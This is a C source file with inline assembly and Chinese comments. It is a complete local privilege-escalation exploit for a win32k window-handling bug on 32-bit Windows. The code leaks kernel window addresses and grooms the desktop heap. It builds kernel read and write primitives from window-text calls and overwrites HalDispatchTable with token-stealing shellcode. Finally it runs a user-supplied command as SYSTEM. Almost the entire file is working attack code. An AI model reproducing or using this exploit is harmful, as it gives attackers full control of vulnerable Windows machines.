#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<Psapi.h>

#define WM_ATTACK 0x1999

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define PROCESS_LINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID


typedef struct _THRDESKHEAD {
	HANDLE  h;
	DWORD   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;
} THRDESKHEAD, * PTHRDESKHEAD;

typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN DWORD Src,
	IN OUT PDWORD Profile
);

HMValidateHandle_t HMValidateHandle = 0;
NtQueryIntervalProfile_t NtQueryIntervalProfile = 0;

static BOOLEAN g_bIsAttacked = FALSE;
static DWORD g_dwWhat = 0;
static HWND g_hWndList[0x100] = { 0 };
static DWORD g_spKwnd[0x100] = { 0 };

static VOID AttackPayload() {
	__asm {
		pushad; 保存堆栈状态
		xor eax, eax
		mov eax, fs: [eax + KTHREAD_OFFSET] ; 获取当前进程对象 _EPROCESS
		mov eax, [eax + EPROCESS_OFFSET]
		mov ebx, eax; ebx保存的是当前进程的_EPROCESS
		mov ecx, SYSTEM_PID

		; 开始搜索system进程的_EPROCESS
		SearchSystemPID :
		mov eax, [eax + PROCESS_LINK_OFFSET]
			sub eax, PROCESS_LINK_OFFSET
			cmp[eax + PID_OFFSET], ecx; 判断是否是system的PID
			jne SearchSystemPID

			; 如果是则开始将当前进程的TOKEN替换程system的TOKEN
			mov edx, [eax + TOKEN_OFFSET]; 取得system的TOKEN
			mov[ebx + TOKEN_OFFSET], edx; 替换当前进程的TOKEN
			popad; 恢复堆栈状态

	}
	g_bIsAttacked = TRUE;
	
}

BOOLEAN Init() {
	int offset = 0;
	DWORD next_code = 0;
	PVOID DriverBase[1024] = { 0 };
	CHAR DriveName[1024] = { 0 };
	DWORD dwRetBytes = 0;
	int Kernel_Base_index = 0;
	HMODULE hKernel = 0;

	for (int i = 0; i < 0x100; i++) {
		PUCHAR tr = (PUCHAR)IsMenu + i;
		if (*tr == 0xE8)
		{//找到调用HMValidateHandle的指令位置
			offset = *(int*)((PCHAR)IsMenu + i + 1);
			next_code = (DWORD)IsMenu + i + 5;
			HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
			break;
		}
	}
	if (!HMValidateHandle) {
		printf("[!]Error: %d\n",__LINE__-1);
		return FALSE;
	}
	printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);
	
	HMODULE hNtdll = LoadLibraryA("ntdll");
	if (!hNtdll) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return FALSE;
	}

	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	if (!NtQueryIntervalProfile) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return FALSE;
	}
	printf("[+]Found NtQueryIntervalProfile = 0x%p\n", NtQueryIntervalProfile);

	EnumDeviceDrivers(DriverBase, sizeof(DriverBase), &dwRetBytes);
	if (dwRetBytes < 0) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return FALSE;
	}
	//寻找内核ntkrnlpa.exe
	for (int i = 0; i < dwRetBytes / sizeof(DriverBase[0]); i++) {
		if (!GetDeviceDriverBaseNameA(DriverBase[i], DriveName, 1024)) {
			printf("[!]Error: %d\n", __LINE__ - 2);
			return FALSE;
		}
		PCHAR str = strlwr(DriveName);
		if (str != NULL && (strcmp(str, "ntkrnlpa") == 0 || strstr(str, "nt"))) {
			Kernel_Base_index = i;
			break;
		}
	}
	//获取HalDispatchTable的偏移
	hKernel = LoadLibraryA(DriveName);
	if (!hKernel) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return FALSE;
	}

	DWORD HalDispatchTableAddrOffset = (DWORD)GetProcAddress(hKernel, "HalDispatchTable") - (DWORD)hKernel;
	if (!HalDispatchTableAddrOffset) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return FALSE;
	}
	g_dwWhat = HalDispatchTableAddrOffset +
		(DWORD)DriverBase[Kernel_Base_index] + 4;

	return TRUE;
}

VOID Key_Down(WORD wKey) {
	INPUT inpt = { 0 };
	inpt.type = INPUT_KEYBOARD;
	inpt.ki.wVk = wKey;
	inpt.ki.dwFlags = 0;
	SendInput(1, &inpt, sizeof(inpt));
}

VOID Key_Up(WORD wKey) {
	INPUT inpt = { 0 };
	inpt.type = INPUT_KEYBOARD;
	inpt.ki.wVk = wKey;
	inpt.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &inpt, sizeof(inpt));
}

DWORD readDWORD(PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim,DWORD Offset) {
	WCHAR dwVal[4] = {0};

	//修改hWndVictim对应的tagWND->strName 指向自定义的内存
	SetWindowLong(hWndAttack, Offset, (LONG)TargetAddr);
	GetWindowTextW(hWndVictim,dwVal,sizeof(dwVal));
	
	return *(PDWORD)dwVal; 
}

VOID writeDWORD(
	PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim, DWORD Offset, DWORD Value
) {
	//修改hWndVictim对应的tagWND->strName 指向自定义的内存
	SetWindowLong(hWndAttack, Offset, (LONG)TargetAddr);
	SetWindowTextW(hWndVictim, (PWCHAR)&Value);
}

static DWORD WINAPI Exploit_Thread(LPVOID lParam) {
	WNDCLASSEXW wcs = { 0 };
	wcs.cbSize = sizeof(WNDCLASSEXW);
	wcs.cbWndExtra = 0;
	wcs.hInstance = GetModuleHandleA(0);
	wcs.lpszMenuName = 0;
	wcs.lpfnWndProc = DefWindowProcW;
	
	for (int i = 0; i < 0x100;) {
		WCHAR wszClsName[0x20];
		wsprintfW(wszClsName, L"%d", (i + 1) * 1998);
		wcs.lpszClassName = wszClsName;
		if (!RegisterClassExW(&wcs)) {
			continue;
		}
		HWND hTmp = CreateWindowExW(
			NULL,
			wszClsName,
			L"Hack",
			WS_VISIBLE ,
			0, 0, 1, 1, GetDesktopWindow(), 0, GetModuleHandleA(0), 0
		);
		if (!hTmp) {
			continue;
		}
		g_spKwnd[i] = *(DWORD_PTR*)((PCHAR)HMValidateHandle(hTmp, 1) + 0x10);
		g_hWndList[i++] = hTmp;
	}
	HWND hWndAttack = 0;
	HWND hWndVictim = 0;
	DWORD spKwndAttack = 0;
	DWORD spKwndVictim = 0;

	BOOLEAN bOver = FALSE;
	//寻找在内核中位置相距在0x3FD00之内的两个窗口，其余窗口全部销毁
	for (int i = 0; i < 0x100 - 1 && !bOver; i++) {
		for (int j = i + 1; j < 0x100; j++) {
			hWndAttack = g_spKwnd[i] > g_spKwnd[j] ? g_hWndList[j] : g_hWndList[i];
			hWndVictim= (g_spKwnd[i] < g_spKwnd[j]) ? g_hWndList[j] : g_hWndList[i];

			spKwndAttack = (g_spKwnd[i] < g_spKwnd[j]) ? g_spKwnd[i] : g_spKwnd[j];
			spKwndVictim = (g_spKwnd[i] > g_spKwnd[j]) ? g_spKwnd[i] : g_spKwnd[j];

			if (spKwndVictim - spKwndAttack < 0x3FD000)
			{
				g_hWndList[i] = g_hWndList[j] = 0;
				bOver = TRUE;
				break;
			}
		}
	}
	
	for (int i = 0; i < 0x100; i++)
		DestroyWindow(g_hWndList[i]);

	printf("[+]spKwndAttack = 0x%p\n", spKwndAttack);
	printf("[+]spKwndVictim = 0x%p\n", spKwndVictim);
	
	if (spKwndAttack == 0 || spKwndVictim == 0) {
		printf("[+]Error:%d\n", __LINE__ - 1);
		return 0;
	}
	//创建一个触发漏洞的窗口
	wcs.lpszClassName = L"Trigger";
	wcs.cbWndExtra = 0;
	if (!RegisterClassExW(&wcs)) {
		printf("[+]Error:%d\n",__LINE__-1);
		return 0;
	}

	HWND hWndTrigger = CreateWindowExW(
		NULL,
		L"Trigger",
		NULL,
		WS_VISIBLE,
		0, 0, 1, 1, GetDesktopWindow(), 0, GetModuleHandleA(0), 0
	);
	SetWindowLongPtrA(hWndTrigger, GWL_STYLE, WS_CHILD);
	DWORD dwValue = 0;
	dwValue = (DWORD)spKwndAttack + 0x90 + 3 - 0x14;
	//修改hWndAttack对应的tagWnd->cbwndExtra=0x400000;
	SetWindowLongPtrA(hWndTrigger, GWLP_ID, dwValue);
	//设置父窗口的spmenu
	
	ShowWindow(hWndTrigger, SW_SHOWNORMAL);
	SetForegroundWindow(hWndTrigger);

	SwitchToThisWindow(GetDesktopWindow(), TRUE);
	Key_Down(VK_MENU);
	Key_Down(VK_ESCAPE);
	Key_Up(VK_ESCAPE);
	Key_Up(VK_MENU);

	DWORD kWndTrigger = *(PDWORD)((PCHAR)HMValidateHandle(hWndTrigger, 1) + 0x10);
	printf("[+]kWndTrigger = 0x%p\n", kWndTrigger);

	DWORD strNameOffset= spKwndVictim - spKwndAttack + 0x84 - 0xb0 + 8;

	printf("[+]dwOffset = 0x%p\n", strNameOffset);
	DWORD dwOldstrName= readDWORD(&strNameOffset, hWndAttack, hWndVictim, strNameOffset);
	printf("[+]dwOld = 0x%p\n", dwOldstrName);

	DWORD dwOldHalTbl= readDWORD((LPVOID)g_dwWhat, hWndAttack, hWndVictim, strNameOffset);
	printf("[+]dwOldHalTbl = 0x%p\n", dwOldHalTbl);

	writeDWORD((PVOID)g_dwWhat,hWndAttack, hWndVictim, strNameOffset, (DWORD)&AttackPayload);

	DWORD ret = 0;
	NtQueryIntervalProfile(0x1998, &ret);

	//恢复防止蓝屏
	writeDWORD((PVOID)(kWndTrigger + 0x84), hWndAttack, hWndVictim, strNameOffset, dwOldstrName);
	writeDWORD((PVOID)g_dwWhat, hWndAttack, hWndVictim, strNameOffset, dwOldHalTbl);

	MSG msg = { 0 };
	while (GetMessageA(&msg, NULL, 0, 0) && !g_bIsAttacked)
	{
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
	return 1;
}

int main(int argc, char** argv) {
	if (!Init()) {
		printf("[!]Error:%d\n", __LINE__ - 1);
		return 1;
	}
	//创建攻击线程
	HANDLE hThread = CreateThread(0, 0, Exploit_Thread, 0, 0, 0);
	if (!hThread) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 1;
	}
	//等待攻击线程执行完毕
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (!g_bIsAttacked) {
		printf("[*]Attack failed!\n");
		return 1;
	}
	//攻击成功
	printf("\n\n[*]Try execute %s as SYSTEM!\n", argv[1]);
	system(argv[1]);
	
	return 0;
}